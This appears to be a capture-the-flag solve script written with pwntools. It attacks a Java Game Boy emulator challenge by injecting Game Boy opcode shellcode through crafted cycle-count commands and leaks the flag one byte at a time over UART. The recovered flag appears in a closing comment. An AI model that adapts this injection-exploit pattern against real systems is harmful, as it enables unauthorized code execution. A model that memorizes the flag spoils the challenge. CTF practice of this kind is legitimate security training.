from pwn import *
import re

# opcodes from https://www.pastraiser.com

entry = 0x100
enable_interrupts = 0xB

FIRST_OFFSET = 32 + 326

ROUTINE_OFFSET = 320

UART = 0x01
LDH_a8_A = 0xE0
LD_A_BYTE = 0x3E
LD_A_a16 = 0xFA
NOP = 0x00

FLAG_START = 0x12

LD_C_d8 = 0x0E
LD_A_aC = 0xF2
LD_A_aBC = 0x0A

PADDING = 0x13
PADDING2 = 0x91

# nops cost 8 cycles
nop_cost = 8


char = "a"


def write_short(byte1, byte2):
    global char
    short = int(str(hex(byte1)[2:]) + str(hex(byte2)[2:].rjust(2, "0")), 16)
    print(short)
    cycles = (short - ROUTINE_OFFSET - 2) * 4
    print(cycles)
    r.recvuntil("Please enter your next command: ")
    r.sendline(char + " " + str(cycles))
    char = chr(ord(char) ^ ord("b") ^ ord("a"))


out = ""


def run_shellcode():
    global out
    global char
    r.clean(0)
    r.sendline(char + " 32000")
    # r.clean(1))
    res = r.clean(1).decode("ISO-8859-1")
    print(res)
    out += re.search("d: (.)P", res).groups()[0]


# for c in range(0,len(payload),2):
#     print(hex(payload[c]) + hex(payload[c+1])[2:])


for _ in range(30):
    r = process(["/usr/bin/java", "com.garrettgu.oopboystripped.GameBoy"])
    # r = remote("3.91.17.218", 9002)

    payload = [
        # write byte to UART
        # UART, PADDING2,
        UART,
        LDH_a8_A,
        # read byte from flag
        0x12,
        LD_A_aBC,
        0x13,
        FLAG_START,
        LD_C_d8,
        NOP,
    ]
    r.sendline("a 256")
    r.sendline("b 256")

    for s in range(0, len(payload), 2):
        write_short(payload[s], payload[s + 1])

    run_shellcode()
    FLAG_START += 1
    print(FLAG_START)
    print(out)
    char = "a"
    r.close()

# utflag{dmg_cool_ciAkDGw5cf}
